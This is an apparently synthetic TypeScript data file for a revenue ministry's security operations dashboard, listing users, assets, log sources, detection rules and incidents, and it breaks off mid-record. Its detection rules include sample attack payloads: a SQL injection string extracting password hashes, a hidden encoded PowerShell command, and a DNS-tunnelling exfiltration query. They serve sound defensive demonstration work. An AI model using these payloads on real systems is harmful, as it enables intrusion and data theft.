/**
 * Ministry of Revenue SOC - Simulated Demonstration Data Store
 * All data is synthetic and designed for demonstration of the SOC architecture.
 */

import {
  SecurityEvent,
  Incident,
  Alert,
  LogSource,
  Asset,
  DetectionRule,
  ThreatIndicator,
  AuditLog,
  User,
  TimeRangeOption,
  TimeRangeMetrics,
  SystemHealthMetrics,
  NetworkFlow
} from '../types/soc';

export const INITIAL_USERS: User[] = [
  {
    id: 'USR-001',
    name: 'Endale Aychew',
    email: 'endale.a@revenue.gov.et',
    role: 'Security Administrator',
    status: 'Active',
    lastLogin: '2026-10-15 09:42:15',
    department: 'Directorate of Cybersecurity & Infrastructure'
  },
  {
    id: 'USR-002',
    name: 'Biks Biset',
    email: 'biks.b@revenue.gov.et',
    role: 'SOC Analyst',
    status: 'Active',
    lastLogin: '2026-10-15 08:30:11',
    department: 'SOC Operations Level 2'
  },
  {
    id: 'USR-003',
    name: 'Bethlehem Haile',
    email: 'bethlehem.h@revenue.gov.et',
    role: 'Incident Responder',
    status: 'Active',
    lastLogin: '2026-10-15 09:12:04',
    department: 'Cyber Incident Response Team (CIRT)'
  },
  {
    id: 'USR-004',
    name: 'Mekonnen Wolde',
    email: 'mekonnen.w@revenue.gov.et',
    role: 'Auditor',
    status: 'Active',
    lastLogin: '2026-10-14 16:22:40',
    department: 'Internal Audit & Compliance'
  },
  {
    id: 'USR-005',
    name: 'Hon. Almaz Mengistu',
    email: 'almaz.m@revenue.gov.et',
    role: 'Management / Read-only Viewer',
    status: 'Active',
    lastLogin: '2026-10-15 07:45:00',
    department: 'Executive Leadership & IT Governance'
  }
];

export const INITIAL_ASSETS: Asset[] = [
  {
    id: 'AST-1001',
    hostname: 'DC01-HQ.revenue.gov.et',
    type: 'Domain Controller',
    os: 'Windows Server 2022 Datacenter',
    ipAddress: '10.100.10.10',
    macAddress: '00:50:56:B2:41:01',
    criticality: 'mission_critical',
    status: 'Online',
    lastSeen: 'Just now',
    associatedAlertCount: 3,
    associatedIncidentCount: 1,
    department: 'Core Infrastructure',
    agentVersion: 'v4.18.2-rev',
    assignedAdmin: 'Endale Aychew'
  },
  {
    id: 'AST-1002',
    hostname: 'DB-TAX-01.revenue.gov.et',
    type: 'Database Server',
    os: 'Red Hat Enterprise Linux 9.4',
    ipAddress: '10.100.20.15',
    macAddress: '00:50:56:B2:41:02',
    criticality: 'mission_critical',
    status: 'Online',
    lastSeen: '1 min ago',
    associatedAlertCount: 2,
    associatedIncidentCount: 1,
    department: 'SIGTAS Core Tax Systems',
    agentVersion: 'v4.18.2-rev',
    assignedAdmin: 'Biks Biset'
  },
  {
    id: 'AST-1003',
    hostname: 'WEB-ETAX-PRD01',
    type: 'Web Server',
    os: 'Ubuntu 24.04 LTS (Nginx/Node.js)',
    ipAddress: '10.100.30.20',
    macAddress: '00:50:56:B2:41:03',
    criticality: 'mission_critical',
    status: 'Online',
    lastSeen: 'Just now',
    associatedAlertCount: 6,
    associatedIncidentCount: 2,
    department: 'Public e-Tax Portal Services',
    agentVersion: 'v4.18.2-rev',
    assignedAdmin: 'Biks Biset'
  },
  {
    id: 'AST-1004',
    hostname: 'ASYCUDA-GATEWAY-01',
    type: 'Linux Server',
    os: 'Oracle Linux 8.8 (Customs Engine)',
    ipAddress: '10.100.25.10',
    macAddress: '00:50:56:B2:41:04',
    criticality: 'mission_critical',
    status: 'Online',
    lastSeen: 'Just now',
    associatedAlertCount: 1,
    associatedIncidentCount: 0,
    department: 'Customs Transit & Tariff Border Operations',
    agentVersion: 'v4.18.1-rev',
    assignedAdmin: 'Endale Aychew'
  },
  {
    id: 'AST-1005',
    hostname: 'FW-PERIMETER-01',
    type: 'Firewall',
    os: 'PAN-OS 11.1 (Next-Gen Firewall)',
    ipAddress: '196.188.120.1',
    macAddress: '00:1B:17:00:3E:99',
    criticality: 'mission_critical',
    status: 'Online',
    lastSeen: 'Just now',
    associatedAlertCount: 12,
    associatedIncidentCount: 1,
    department: 'Perimeter Security',
    assignedAdmin: 'Endale Aychew'
  },
  {
    id: 'AST-1006',
    hostname: 'VPN-GW-ADDIS',
    type: 'Network Switch',
    os: 'FortiOS 7.4.3 Enterprise VPN',
    ipAddress: '196.188.120.5',
    macAddress: '70:4C:A5:11:82:F0',
    criticality: 'high',
    status: 'Online',
    lastSeen: 'Just now',
    associatedAlertCount: 4,
    associatedIncidentCount: 1,
    department: 'Remote Access & Field Audits',
    assignedAdmin: 'Endale Aychew'
  },
  {
    id: 'AST-1007',
    hostname: 'EXCHANGE-01.revenue.gov.et',
    type: 'Windows Server',
    os: 'Windows Server 2022 / Exchange 2019',
    ipAddress: '10.100.15.5',
    macAddress: '00:50:56:B2:41:07',
    criticality: 'high',
    status: 'Online',
    lastSeen: '2 min ago',
    associatedAlertCount: 2,
    associatedIncidentCount: 1,
    department: 'Messaging & Collaboration',
    agentVersion: 'v4.18.2-rev',
    assignedAdmin: 'Biks Biset'
  },
  {
    id: 'AST-1008',
    hostname: 'WS-FINANCE-019',
    type: 'Workstation',
    os: 'Windows 11 Enterprise (23H2)',
    ipAddress: '10.100.40.88',
    macAddress: '3C:52:82:94:11:02',
    criticality: 'medium',
    status: 'Warning',
    lastSeen: '14 min ago',
    associatedAlertCount: 3,
    associatedIncidentCount: 1,
    department: 'Large Taxpayers Office (LTO)',
    agentVersion: 'v4.18.0-rev',
    assignedAdmin: 'Biks Biset'
  },
  {
    id: 'AST-1009',
    hostname: 'WS-CUSTOMS-MOYALE-04',
    type: 'Workstation',
    os: 'Windows 11 Pro',
    ipAddress: '10.105.10.44',
    macAddress: 'A4:BB:6D:32:98:C1',
    criticality: 'medium',
    status: 'Online',
    lastSeen: '3 min ago',
    associatedAlertCount: 1,
    associatedIncidentCount: 0,
    department: 'Moyale Border Crossing Station',
    agentVersion: 'v4.18.1-rev',
    assignedAdmin: 'Biks Biset'
  },
  {
    id: 'AST-1010',
    hostname: 'DNS-RESOLVER-01',
    type: 'Linux Server',
    os: 'Debian 12 (BIND9 / Unbound)',
    ipAddress: '10.100.10.2',
    macAddress: '00:50:56:B2:41:10',
    criticality: 'high',
    status: 'Online',
    lastSeen: 'Just now',
    associatedAlertCount: 5,
    associatedIncidentCount: 1,
    department: 'Core Infrastructure',
    agentVersion: 'v4.18.2-rev',
    assignedAdmin: 'Endale Aychew'
  },
  {
    id: 'AST-1011',
    hostname: 'DHCP-ROUTER-KIRKOS',
    type: 'Network Switch',
    os: 'Cisco IOS-XE 17.9',
    ipAddress: '10.102.1.1',
    macAddress: '00:26:0B:44:E2:10',
    criticality: 'medium',
    status: 'Online',
    lastSeen: 'Just now',
    associatedAlertCount: 0,
    associatedIncidentCount: 0,
    department: 'Kirkos Branch Network',
    assignedAdmin: 'Endale Aychew'
  },
  {
    id: 'AST-1012',
    hostname: 'WS-AUDIT-HAWASSA-07',
    type: 'Workstation',
    os: 'Windows 11 Enterprise',
    ipAddress: '10.103.10.19',
    macAddress: '54:B8:0A:77:22:15',
    criticality: 'low',
    status: 'Online',
    lastSeen: '5 min ago',
    associatedAlertCount: 0,
    associatedIncidentCount: 0,
    department: 'Hawassa Branch Audit Team',
    agentVersion: 'v4.18.2-rev',
    assignedAdmin: 'Biks Biset'
  }
];

export const INITIAL_LOG_SOURCES: LogSource[] = [
  {
    id: 'SRC-001',
    name: 'Windows Active Directory Domain Controllers',
    type: 'Active Directory',
    hostname: 'DC01-HQ.revenue.gov.et / DC02-HQ',
    collectionMethod: 'WEF',
    ipAddress: '10.100.10.10',
    lastEventReceived: '3 seconds ago',
    eventsPerMinute: 4850,
    parsingSuccessRate: 99.8,
    status: 'healthy',
    dataFreshness: '< 5 sec',
    retentionDays: 180,
    enabled: true,
    totalEventsProcessed: 142850900
  },
  {
    id: 'SRC-002',
    name: 'Windows Endpoints (Workstations & Laptops)',
    type: 'Windows endpoints',
    hostname: '1,840 Monitored Endpoints',
    collectionMethod: 'Endpoint Agent',
    ipAddress: '10.100.0.0/16',
    lastEventReceived: 'Just now',
    eventsPerMinute: 3240,
    parsingSuccessRate: 99.4,
    status: 'healthy',
    dataFreshness: '< 10 sec',
    retentionDays: 90,
    enabled: true,
    totalEventsProcessed: 89420000
  },
  {
    id: 'SRC-003',
    name: 'Core Perimeter Firewalls (HA Cluster)',
    type: 'Firewall',
    hostname: 'FW-PERIMETER-01 / FW-PERIMETER-02',
    collectionMethod: 'Syslog',
    ipAddress: '196.188.120.1',
    lastEventReceived: 'Just now',
    eventsPerMinute: 6120,
    parsingSuccessRate: 99.9,
    status: 'healthy',
    dataFreshness: '< 2 sec',
    retentionDays: 365,
    enabled: true,
    totalEventsProcessed: 245100800
  },
  {
    id: 'SRC-004',
    name: 'DNS & DHCP Authority Servers',
    type: 'DNS and DHCP',
    hostname: 'DNS-RESOLVER-01 / DNS-RESOLVER-02',
    collectionMethod: 'Syslog',
    ipAddress: '10.100.10.2',
    lastEventReceived: '1 second ago',
    eventsPerMinute: 2450,
    parsingSuccessRate: 99.1,
    status: 'healthy',
    dataFreshness: '< 3 sec',
    retentionDays: 90,
    enabled: true,
    totalEventsProcessed: 68100500
  },
  {
    id: 'SRC-005',
    name: 'e-Tax Public Web Application & API Gateways',
    type: 'Web server and applications',
    hostname: 'WEB-ETAX-PRD01..04',
    collectionMethod: 'Syslog',
    ipAddress: '10.100.30.20',
    lastEventReceived: 'Just now',
    eventsPerMinute: 1980,
    parsingSuccessRate: 98.9,
    status: 'healthy',
    dataFreshness: '< 5 sec',
    retentionDays: 180,
    enabled: true,
    totalEventsProcessed: 54100900
  },
  {
    id: 'SRC-006',
    name: 'SIGTAS Database Servers (PostgreSQL & Oracle RAC)',
    type: 'Database servers',
    hostname: 'DB-TAX-01 / DB-TAX-02',
    collectionMethod: 'Database JDBC',
    ipAddress: '10.100.20.15',
    lastEventReceived: '8 seconds ago',
    eventsPerMinute: 890,
    parsingSuccessRate: 99.7,
    status: 'healthy',
    dataFreshness: '< 15 sec',
    retentionDays: 365,
    enabled: true,
    totalEventsProcessed: 28400000
  },
  {
    id: 'SRC-007',
    name: 'ASYCUDA Customs System & Linux Servers',
    type: 'Linux servers',
    hostname: 'ASYCUDA-GATEWAY-01..03',
    collectionMethod: 'Syslog',
    ipAddress: '10.100.25.10',
    lastEventReceived: '12 seconds ago',
    eventsPerMinute: 620,
    parsingSuccessRate: 97.4,
    status: 'delayed',
    dataFreshness: '~ 45 sec',
    retentionDays: 180,
    enabled: true,
    errorLog: 'Intermittent socket buffer delay from branch forwarding proxy',
    totalEventsProcessed: 18900000
  },
  {
    id: 'SRC-008',
    name: 'Fortinet SSL-VPN Remote Access Gateways',
    type: 'VPN',
    hostname: 'VPN-GW-ADDIS',
    collectionMethod: 'Syslog',
    ipAddress: '196.188.120.5',
    lastEventReceived: 'Just now',
    eventsPerMinute: 410,
    parsingSuccessRate: 99.6,
    status: 'healthy',
    dataFreshness: '< 4 sec',
    retentionDays: 180,
    enabled: true,
    totalEventsProcessed: 12500000
  },
  {
    id: 'SRC-009',
    name: 'Microsoft Exchange & Mail Protection Gateway',
    type: 'Email security',
    hostname: 'EXCHANGE-01.revenue.gov.et',
    collectionMethod: 'WinRM',
    ipAddress: '10.100.15.5',
    lastEventReceived: '4 seconds ago',
    eventsPerMinute: 530,
    parsingSuccessRate: 99.2,
    status: 'healthy',
    dataFreshness: '< 10 sec',
    retentionDays: 120,
    enabled: true,
    totalEventsProcessed: 16800000
  },
  {
    id: 'SRC-010',
    name: 'Regional Core Routers & Switches (Cisco IOS-XE)',
    type: 'Routers and switches',
    hostname: 'SW-CORE-HQ / SW-DIST-REG',
    collectionMethod: 'SNMP',
    ipAddress: '10.100.1.1',
    lastEventReceived: 'Just now',
    eventsPerMinute: 840,
    parsingSuccessRate: 98.1,
    status: 'healthy',
    dataFreshness: '< 6 sec',
    retentionDays: 90,
    enabled: true,
    totalEventsProcessed: 23400000
  },
  {
    id: 'SRC-011',
    name: 'Windows Servers Infrastructure (App & File)',
    type: 'Windows servers',
    hostname: 'FS01-HQ / APP01..08',
    collectionMethod: 'WEF',
    ipAddress: '10.100.12.0/24',
    lastEventReceived: '14 seconds ago',
    eventsPerMinute: 1100,
    parsingSuccessRate: 99.5,
    status: 'healthy',
    dataFreshness: '< 15 sec',
    retentionDays: 180,
    enabled: true,
    totalEventsProcessed: 35200000
  },
  {
    id: 'SRC-012',
    name: 'Mekelle Branch Regional Log Collector Proxy',
    type: 'Syslog',
    hostname: 'LOG-PROXY-MEKELLE',
    collectionMethod: 'Syslog',
    ipAddress: '10.104.1.20',
    lastEventReceived: '38 minutes ago',
    eventsPerMinute: 0,
    parsingSuccessRate: 84.2,
    status: 'offline',
    dataFreshness: '> 30 min',
    retentionDays: 60,
    enabled: true,
    errorLog: 'TLS handshake timeout to collector endpoint: connection refused on port 6514',
    totalEventsProcessed: 4200000
  },
  {
    id: 'SRC-013',
    name: 'Dire Dawa Customs Border Syslog Forwarder',
    type: 'Syslog',
    hostname: 'SYSLOG-FWD-DIREDAWA',
    collectionMethod: 'Syslog',
    ipAddress: '10.106.1.15',
    lastEventReceived: '18 seconds ago',
    eventsPerMinute: 190,
    parsingSuccessRate: 72.8,
    status: 'parsing_error',
    dataFreshness: '< 20 sec',
    retentionDays: 90,
    enabled: true,
    errorLog: 'Unrecognized CEF/RFC5424 header structure; 27.2% events diverted to raw dead-letter queue',
    totalEventsProcessed: 5900000
  },
  {
    id: 'SRC-014',
    name: 'Cloud Infrastructure & API Gateway Integrations',
    type: 'Other supported sources',
    hostname: 'API-GW-EXTERNAL',
    collectionMethod: 'API',
    ipAddress: '196.188.120.90',
    lastEventReceived: '6 seconds ago',
    eventsPerMinute: 310,
    parsingSuccessRate: 99.9,
    status: 'healthy',
    dataFreshness: '< 10 sec',
    retentionDays: 180,
    enabled: true,
    totalEventsProcessed: 9800000
  }
];

export const INITIAL_DETECTION_RULES: DetectionRule[] = [
  {
    id: 'RULE-101',
    name: 'Multiple Failed Active Directory Logins Followed by Success',
    description: 'Detects potential password spraying or brute force attack against Ministry domain credentials followed by valid authentication.',
    severity: 'critical',
    category: 'Authentication',
    detectionLogic: 'COUNT(EventCode == 4625) >= 5 GROUP_BY(TargetUserName, TargetDomainName) WITHIN 5m FOLLOWED_BY EventCode == 4624',
    requiredSources: ['Windows Active Directory Domain Controllers', 'Windows Endpoints'],
    enabled: true,
    lastTriggered: '14 minutes ago',
    timeWindowMinutes: 5,
    investigationGuidance: 'Identify the originating workstation or remote VPN IP. Check if user account privileges were altered, verify with employee, check concurrent active sessions.',
    sampleTestPayload: 'EventCode=4625 User=tadesse.b Workstation=WS-REMOTE Count=6 followed by EventCode=4624'
  },
  {
    id: 'RULE-102',
    name: 'Pass-the-Hash / Overpass-the-Hash Indicator',
    description: 'Identifies Kerberos TGS request using NTLM hash with uncommon encryption types (RC4-HMAC) in high-security environment.',
    severity: 'critical',
    category: 'Authentication',
    detectionLogic: 'EventCode == 4769 AND TicketEncryptionType == "0x17" AND TargetUserName LIKE "%Admin%"',
    requiredSources: ['Windows Active Directory Domain Controllers'],
    enabled: true,
    lastTriggered: '2 hours ago',
    timeWindowMinutes: 10,
    investigationGuidance: 'Isolate affected host immediately. Dump volatile RAM memory, verify domain admin credential compromise, initiate Kerberos KRBTGT password reset procedure.',
    sampleTestPayload: 'EventCode=4769 TicketEncryptionType=0x17 TargetUserName=svc_tax_admin IP=10.100.40.88'
  },
  {
    id: 'RULE-103',
    name: 'SQL Injection Attack Signature on e-Tax Public Endpoints',
    description: 'Detects UNION SELECT, stacked queries, boolean-based SQL injection strings in HTTP GET/POST queries targeted at e-Tax tax payment forms.',
    severity: 'critical',
    category: 'Web Application',
    detectionLogic: 'http.request.uri MATCHES regex("(union\\s+select|waitfor\\s+delay|information_schema|or\\s+1=1)")',
    requiredSources: ['e-Tax Public Web Application & API Gateways', 'Core Perimeter Firewalls'],
    enabled: true,
    lastTriggered: '22 minutes ago',
    timeWindowMinutes: 1,
    investigationGuidance: 'Review WAF block status, check backend database error logs on DB-TAX-01, verify if response status was HTTP 403 or 200, check if database records were accessed.',
    sampleTestPayload: 'URI: /api/taxpayers/lookup?tin=0012938472%27%20UNION%20SELECT%20null,username,password_hash%20FROM%20users--'
  },
  {
    id: 'RULE-104',
    name: 'Cobalt Strike / Meterpreter Beaconing over Encrypted HTTPS',
    description: 'Identifies periodic outbound HTTPS connections exhibiting high jitter regularity and low payload variance toward unclassified IP addresses.',
    severity: 'high',
    category: 'Malware',
    detectionLogic: 'flow.outbound.interval_variance < 0.08 AND flow.duration > 1800 AND dest.ip.reputation < 30',
    requiredSources: ['Core Perimeter Firewalls', 'Windows Endpoints'],
    enabled: true,
    lastTriggered: '37 minutes ago',
    timeWindowMinutes: 30,
    investigationGuidance: 'Inspect endpoint process parentage using EDR agent telemetry. Terminate suspicious rundll32/powershell spawn. Block destination IP at perimeter firewall.',
    sampleTestPayload: 'Host=WS-FINANCE-019 RemoteIP=185.220.101.42 Interval=60s Jitter=2.1% Protocol=TLS'
  },
  {
    id: 'RULE-105',
    name: 'DNS Tunneling and Data Exfiltration Activity',
    description: 'Detects anomalous volume of high-entropy TXT/NULL queries targeted at suspicious external nameservers, indicative of data staging or C2.',
    severity: 'high',
    category: 'DNS and DHCP',
    detectionLogic: 'dns.query.length > 55 AND dns.query.entropy > 4.2 AND COUNT(dns.queries) > 100 WITHIN 2m',
    requiredSources: ['DNS & DHCP Authority Servers'],
    enabled: true,
    lastTriggered: '1 hour ago',
    timeWindowMinutes: 2,
    investigationGuidance: 'Examine requested subdomains for base64/hex data chunks. Identify originating client IP on internal subnet and perform packet payload capture.',
    sampleTestPayload: 'Query: aXRhLTk5MjgxLWNvcmUtdGF4LWRi.ns1.darkrouting-update.net Type=TXT Host=10.100.40.88'
  },
  {
    id: 'RULE-106',
    name: 'Suspicious PowerShell Execution with Encoded Command',
    description: 'Detects PowerShell invocation with flags -enc, -encodedcommand, or execution bypass flags from non-administrative user contexts.',
    severity: 'high',
    category: 'Endpoint',
    detectionLogic: 'process.name == "powershell.exe" AND process.command_line MATCHES "(?i)(-enc|-encodedcommand|-w\\s+hidden|-exec\\s+bypass)"',
    requiredSources: ['Windows Endpoints', 'Windows Servers Infrastructure'],
    enabled: true,
    lastTriggered: '45 minutes ago',
    timeWindowMinutes: 5,
    investigationGuidance: 'Decode base64 command string, check parent process (e.g. WINWORD, OUTLOOK, or CMD), verify downloaded payloads in %TEMP% directory.',
    sampleTestPayload: 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ...'
  },
  {
    id: 'RULE-107',
    name: 'Mass Revenue Record Export / Anomalous Data Transfer',
    description: 'Detects database read extraction exceeding 50,000 taxpayer TIN records within a 10-minute window outside business hours.',
    severity: 'high',
    category: 'System',
    detectionLogic: 'db.query.records_returned > 50000 AND (TIME < "07:00" OR TIME > "19:00")',
    requiredSources: ['SIGTAS Database Servers', 'Core Perimeter Firewalls'],
    enabled: true,
    lastTriggered: '3 hours ago',
    timeWindowMinutes: 10,
    investigationGuidance: 'Verify whether scheduled government audit job was registered with IT Directorate. Check DBA user identity and target IP of data receipt.',
    sampleTestPayload: 'User: app_report_svc Query: SELECT * FROM taxpayer_ledgers WHERE tax_year=2025 Rows: 84200'
  },
  {
    id: 'RULE-108',
    name: 'Concurrent VPN Logins from Geographically Disparate Locations',
    description: 'Identifies single user credentials connecting via SSL-VPN simultaneously or within impossible travel timeframe (< 1 hour across countries).',
    severity: 'medium',
    category: 'Authentication',
    detectionLogic: 'COUNT_DISTINCT(vpn.client.country) > 1 GROUP_BY(vpn.username) WITHIN 60m',
    requiredSources: ['Fortinet SSL-VPN Remote Access Gateways'],
    enabled: true,
    lastTriggered: '4 hours ago',
    timeWindowMinutes: 60,
    investigationGuidance: 'Terminate active VPN sessions immediately. Reset LDAP/AD user password, enforce hardware token MFA challenge.',
    sampleTestPayload: 'User: solomon.k Login1: Addis Ababa (196.188.12.4) Login2: Amsterdam (45.142.122.9)'
  },
  {
    id: 'RULE-109',
    name: 'Security Log Source Silenced or Abruptly Terminated',
    description: 'Triggers when a critical log source stops sending heartbeat or log telemetry for greater than 15 consecutive minutes.',
    severity: 'high',
    category: 'System',
    detectionLogic: 'log_source.last_heartbeat > 15m AND log_source.expected_rate > 100/min',
    requiredSources: ['Log Collector Engine'],
    enabled: true,
    lastTriggered: '38 minutes ago',
    timeWindowMinutes: 15,
    investigationGuidance: 'Check network connectivity to remote branch, inspect remote syslog-ng / winlogbeat daemon status, rule out deliberate log tampering.',
    sampleTestPayload: 'Source: Mekelle Branch Regional Log Collector Proxy Status: NO_DATA_SINCE_10_20'
  },
  {
    id: 'RULE-110',
    name: 'Ransomware Canary File Modification or Mass File Renaming',
    description: 'Detects modifications to hidden Canary decoy files or rapid file extension changes (.locked, .encrypted) on network shares.',
    severity: 'critical',
    category: 'Malware',
    detectionLogic: 'file.path MATCHES ".*\\\\CanaryDecoy\\\\.*" OR (COUNT(file.rename) > 50 WITHIN 1m)',
    requiredSources: ['Windows Endpoints', 'Windows Servers Infrastructure'],
    enabled: true,
    lastTriggered: 'Yesterday',
    timeWindowMinutes: 1,
    investigationGuidance: 'TRIGGER TIER-1 CONTAINMENT: Isolate host network port immediately, unmount SMB shares, take system memory image before reboot.',
    sampleTestPayload: 'CanaryDecoy.docx modified by process svchost_fake.exe (PID: 4920)'
  }
];

export const INITIAL_INCIDENTS: Incident[] = [
  {
    id: 'INC-2026-0041',
    title: 'Suspected Cobalt Strike Beaconing & Data Staging on Finance Workstation',
    severity: 'critical',
    status: 'investigating',
    detectionTime: '2026-10-15 09:18:22',
    lastUpdated: '2026-10-15 09:44:05',
    affectedAssets: ['WS-FINANCE-019', 'DB-TAX-01.revenue.gov.et'],
    assignedAnalyst: 'Biks Biset',
    source: 'Windows Endpoints / Perimeter Firewall',
    summary: 'A finance department workstation (WS-FINANCE-019) in the Large Taxpayers Office initiated outbound encrypted C2 communications accompanied by suspicious LDAP enumeration and database query staging.',
    description: 'At 09:18:22, EDR agent on WS-FINANCE-019 reported an anomalous PowerShell process spawned by WINWORD.EXE with Base64 encoded arguments. Follow-up network telemetry revealed recurring outbound TLS connections to 185.220.101.42 (flagged bulletproof host). At 09:31, lateral Kerberos queries towards DB-TAX-01 were observed.',
    relatedEventIds: ['EVT-9921', 'EVT-9922', 'EVT-9924', 'EVT-9928'],
    relatedAlertIds: ['ALT-801', 'ALT-804'],
    timeline: [
      {
        id: 'TL-1',
        timestamp: '2026-10-15 09:18:22',
        user: 'System Detection Rule (RULE-104)',
        action: 'Incident created automatically from Alert ALT-801',
        type: 'status_change'
      },
      {
        id: 'TL-2',
        timestamp: '2026-10-15 09:22:10',
        user: 'Biks Biset (SOC Analyst)',
        action: 'Assigned incident to Biks Biset',
        type: 'assignment'
      },
      {
        id: 'TL-3',
        timestamp: '2026-10-15 09:28:44',
        user: 'Biks Biset',
        action: 'Escalated severity from High to Critical due to lateral database query attempts',
        type: 'severity_change'
      },
      {
        id: 'TL-4',
        timestamp: '2026-10-15 09:35:12',
        user: 'Biks Biset',
        action: 'Initiated host network quarantine request on WS-FINANCE-019',
        type: 'action_taken'
      }
    ],
    notes: [
      {
        id: 'NOTE-1',
        author: 'Biks Biset',
        role: 'SOC Analyst',
        timestamp: '2026-10-15 09:25:30',
        text: 'Initial review of WINWORD parent process indicates user opened an email attachment named "VAT_Reconciliation_Q3_Clarifications.docx". Document contained VBA macro that dropped a staging DLL in %APPDATA%\\Local\\Microsoft\\Windows\\UpdHost.dll.'
      },
      {
        id: 'NOTE-2',
        author: 'Bethlehem Haile',
        role: 'Incident Responder',
        timestamp: '2026-10-15 09:40:15',
        text: 'Perimeter firewall team confirmed blocking IP 185.220.101.42. Working with endpoint team to isolate host WS-FINANCE-019 from the LTO VLAN.'
      }
    ],
    responseActions: [
      {
        id: 'ACT-1',
        actionName: 'Block Outbound C2 Destination IP at Palo Alto Firewalls',
        targetAsset: 'FW-PERIMETER-01',
        initiatedBy: 'Biks Biset',
        timestamp: '2026-10-15 09:32:00',
        status: 'completed',
        resultDetails: 'ACL rule SOC-BLOCK-185.220.101.42 applied successfully across perimeter cluster.'
      },
      {
        id: 'ACT-2',
        actionName: 'Network Isolation of Workstation via EDR Agent',
        targetAsset: 'WS-FINANCE-019',
        initiatedBy: 'Bethlehem Haile',
        timestamp: '2026-10-15 09:38:10',
        status: 'completed',
        resultDetails: 'Workstation isolated from internal network; management tunnel retained for forensic acquisition.'
      }
    ]
  },
  {
    id: 'INC-2026-0040',
    title: 'Distributed SQL Injection & Credential Harvest Campaign on e-Tax Payment Gateway',
    severity: 'critical',
    status: 'contained',
    detectionTime: '2026-10-15 07:44:19',
    lastUpdated: '2026-10-15 09:10:02',
    affectedAssets: ['WEB-ETAX-PRD01', 'FW-PERIMETER-01'],
    assignedAnalyst: 'Bethlehem Haile',
    source: 'Web server and applications',
    summary: 'Automated distributed botnet targeting the Ministry e-Tax authentication portal with high-rate SQL injection payloads seeking to extract taxpayer identification records.',
    description: 'Over 14,200 requests with UNION-based SQL injection payloads originated from multiple IP addresses across 18 countries over a 40-minute span. The attacks specifically targeted the /api/v1/taxpayer/verify endpoint.',
    relatedEventIds: ['EVT-9880', 'EVT-9881', 'EVT-9885'],
    relatedAlertIds: ['ALT-798', 'ALT-800'],
    timeline: [
      {
        id: 'TL-10',
        timestamp: '2026-10-15 07:44:19',
        user: 'WAF Detection Engine',
        action: 'Incident triggered by high SQL injection alert cluster',
        type: 'status_change'
      },
      {
        id: 'TL-11',
        timestamp: '2026-10-15 08:05:00',
        user: 'Bethlehem Haile',
        action: 'Applied rate limiting and enhanced WAF bot challenge rules',
        type: 'action_taken'
      },
      {
        id: 'TL-12',
        timestamp: '2026-10-15 08:45:30',
        user: 'Bethlehem Haile',
        action: 'Status changed to Contained after attack volume dropped to zero',
        type: 'status_change'
      }
    ],
    notes: [
      {
        id: 'NOTE-11',
        author: 'Bethlehem Haile',
        role: 'Incident Responder',
        timestamp: '2026-10-15 08:12:00',
        text: 'Database logs on DB-TAX-01 verified that zero SQL queries executed successfully. Nginx reverse proxy returned HTTP 403 Forbidden on 99.4% of requests.'
      }
    ],
    responseActions: [
      {
        id: 'ACT-11',
        actionName: 'Deploy Dynamic IP Reputation Blacklist to Reverse Proxies',
        targetAsset: 'WEB-ETAX-PRD01',
        initiatedBy: 'Bethlehem Haile',
        timestamp: '2026-10-15 08:02:44',
        status: 'completed',
        resultDetails: 'Blocked 412 offending source IP addresses.'
      }
    ]
  },
  {
    id: 'INC-2026-0039',
    title: 'Privilege Escalation and Unauthorized Role Assignment in Active Directory',
    severity: 'high',
    status: 'investigating',
    detectionTime: '2026-10-15 06:12:08',
    lastUpdated: '2026-10-15 08:50:19',
    affectedAssets: ['DC01-HQ.revenue.gov.et'],
    assignedAnalyst: 'Endale Aychew',
    source: 'Active Directory',
    summary: 'A junior IT contractor account was observed adding a secondary account to the "Domain Admins" and "Revenue Systems Operators" security groups outside approved change management windows.',
    description: 'Event ID 4728 (A member was added to a security-enabled global group) logged on DC01-HQ at 06:12:08. Initiating user was "cont_samuel.k" who does not hold authorization for group membership modification.',
    relatedEventIds: ['EVT-9810', 'EVT-9812'],
    relatedAlertIds: ['ALT-792'],
    timeline: [
      {
        id: 'TL-20',
        timestamp: '2026-10-15 06:12:08',
        user: 'RULE-101 / AD Audit Engine',
        action: 'Incident opened',
        type: 'status_change'
      },
      {
        id: 'TL-21',
        timestamp: '2026-10-15 06:30:15',
        user: 'Endale Aychew',
        action: 'Account cont_samuel.k disabled in Active Directory',
        type: 'action_taken'
      }
    ],
    notes: [
      {
        id: 'NOTE-20',
        author: 'Endale Aychew',
        role: 'Security Administrator',
        timestamp: '2026-10-15 06:35:00',
        text: 'Contacted IT Infrastructure manager. Confirmed no change ticket existed. Group membership was immediately revoked and session tokens invalidated.'
      }
    ],
    responseActions: [
      {
        id: 'ACT-21',
        actionName: 'Disable Account & Invalidate Kerberos TGT',
        targetAsset: 'DC01-HQ.revenue.gov.et',
        initiatedBy: 'Endale Aychew',
        timestamp: '2026-10-15 06:29:40',
        status: 'completed',
        resultDetails: 'Account cont_samuel.k disabled. Unauthorized additions removed from Domain Admins.'
      }
    ]
  },
  {
    id: 'INC-2026-0038',
    title: 'Loss of Telemetry and Log Collector Outage at Mekelle Regional Branch',
    severity: 'medium',
    status: 'investigating',
    detectionTime: '2026-10-15 09:20:10',
    lastUpdated: '2026-10-15 09:39:00',
    affectedAssets: ['LOG-PROXY-MEKELLE'],
    assignedAnalyst: 'Biks Biset',
    source: 'Log Management Engine',
    summary: 'The Mekelle Regional Log Forwarder proxy stopped transmitting syslog and Windows security event streams at 09:20 AM.',
    description: 'Log ingestion pipeline recorded zero events for 35+ minutes from regional subnets 10.104.0.0/16. Remote network gateway is reachable via ICMP, suggesting software crash or service halt rather than wide area network link failure.',
    relatedEventIds: ['EVT-9930'],
    relatedAlertIds: ['ALT-809'],
    timeline: [
      {
        id: 'TL-30',
        timestamp: '2026-10-15 09:20:10',
        user: 'RULE-109 Ingestion Watchdog',
        action: 'Incident triggered for log collector silence',
        type: 'status_change'
      }
    ],
    notes: [
      {
        id: 'NOTE-30',
        author: 'Biks Biset',
        role: 'SOC Analyst',
        timestamp: '2026-10-15 09:35:00',
        text: 'Contacted Mekelle regional IT engineer. Requesting service status of rsyslog and Winlogbeat services.'
      }
    ],
    responseActions: []
  },
  {
    id: 'INC-2026-0037',
    title: 'Multiple Failed Kerberos Pre-Authentication followed by Password Spray',
    severity: 'high',
    status: 'new',
    detectionTime: '2026-10-15 09:05:14',
    lastUpdated: '2026-10-15 09:12:00',
